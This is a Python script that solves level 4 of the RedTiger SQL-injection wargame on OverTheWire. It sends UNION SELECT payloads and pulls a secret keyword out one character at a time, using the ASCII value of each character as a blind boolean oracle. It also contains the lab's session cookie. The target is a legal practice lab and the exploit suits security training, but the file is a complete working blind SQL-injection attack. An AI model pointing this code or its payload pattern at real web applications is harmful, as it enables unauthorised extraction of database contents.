
import requests
from string import printable
#SELECT * FROM ?category? WHERE id = 1 UNION SELECT keyword,1 FROM level4_secret WHERE ASCII(SUBSTRING(keyword,position_of_keyword,1) = ascii_of_printables

url = "https://redtiger.labs.overthewire.org/level4.php"
cookies = {'level4login' : 'put_the_kitten_on_your_head'}

result = ''
for x in range( 1 , 22 ):
    for i in printable:
        params = {'id' : '1 union select keyword, 1 from level4_secret where ascii(substring(keyword,%i,1))= %i'% (x, ord(i))}
        response = requests.get(url, params = params, cookies = cookies)
        if "2 rows" in response.text:
            result += i
            break
    print (result)
    
